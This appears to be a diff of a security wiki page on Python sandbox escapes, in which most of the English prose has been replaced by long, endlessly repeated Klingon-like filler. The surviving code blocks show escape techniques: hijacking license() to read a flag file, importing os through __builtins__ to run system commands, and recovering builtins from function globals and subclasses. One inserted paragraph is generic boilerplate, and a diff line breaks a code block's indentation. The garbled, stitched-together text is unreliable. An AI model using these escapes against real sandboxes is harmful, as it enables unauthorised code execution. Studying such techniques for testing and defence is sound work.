jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'ch
 ```python
 __builtins__.__dict__["license"]._Printer__filenames=["flag"]
 a = __builtins__.help
 a.__class__.__enter__ = __builtins__.__dict__["license"]
 a.__class__.__exit__ = lambda self, *args: None
 with (a as b):
-    pass
+pass
 ```
-
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
-## Builtins
-
-* [**Builtins functions of python2**](https://docs.python.org/2/library/functions.html)
-* [**Builtins functions of python3**](https://docs.python.org/3/library/functions.html)
-
-If you can access the **`__builtins__`** object you can import libraries (notice that you could also use here other string representation shown in the last section):
-
+vulnerabilities vItlhutlhla' 'ej vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' vItlhutlhla' v
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
 ```
+### qo'noS Builtins
 
-### No Builtins
-
-When you don't have `__builtins__` you are not going to be able to import anything nor even read or write files as **all the global functions** (like `open`, `import`, `print`...) **aren't loaded**.\
-However, **by default python imports a lot of modules in memory**. These modules may seem benign, but some of them are **also importing dangerous** functionalities inside of them that can be accessed to gain even **arbitrary code execution**.
-
-In the following examples you can observe how to **abuse** some of this "**benign**" modules loaded to **access** **dangerous** **functionalities** inside of them.
-
-**Python2**
-
+ghobe' `__builtins__` vo' 'oH 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e
 ```python
 #Try to reload __builtins__
 reload(__builtins__)
@@ -399,9 +443,21 @@ import __builtin__
 # Or you could obtain the builtins from a defined function
 get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 ```
-
 #### Python3
 
+Python3 is a powerful programming language that is widely used for various purposes, including web development, data analysis, and automation. It provides a rich set of libraries and frameworks that make it easy to develop complex applications.
+
+However, Python3 also has a feature called "sandboxing" that restricts the execution of certain operations for security reasons. Sandboxing is commonly used in cloud/SaaS platforms to prevent malicious code from accessing sensitive resources or causing harm to the system.
+
+In some cases, you may encounter situations where you need to bypass Python3 sandboxes for legitimate reasons, such as testing the security of an application or analyzing its behavior. This can be achieved by exploiting vulnerabilities or using specific techniques to evade the restrictions imposed by the sandbox.
+
+In this guide, we will explore different methods and resources that can be used to bypass Python3 sandboxes. These techniques range from simple tricks to more advanced exploitation techniques, depending on the complexity of the sandbox and the level of security measures in place.
+
+It is important to note that bypassing Python3 sandboxes without proper authorization is illegal and unethical. This guide is intended for educational purposes only and should not be used for any malicious activities.
+
+If you are a developer or a security professional, understanding how Python3 sandboxes work and how they can be bypassed can help you identify and fix potential vulnerabilities in your applications. It can also help you assess the security of third-party applications that you may be using or testing.
+
+Remember to always obtain proper authorization and follow ethical guidelines when performing any security testing or penetration testing activities.
 ```python
 # Obtain builtins from a globally defined function
 # https://docs.python.org/3/library/functions.html
@@ -420,19 +476,93 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-
-[**Below there is a bigger function**](./#recursive-search-of-builtins-globals) to find tens/**hundreds** of **places** were you can find the **builtins**.
-
-#### Python2 and Python3
-
+[**ghItlhvam**](./#recursive-search-of-builtins-globals) **vItlhutlh** **qagh** **qo'noS** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** **'ej** **'ay'** 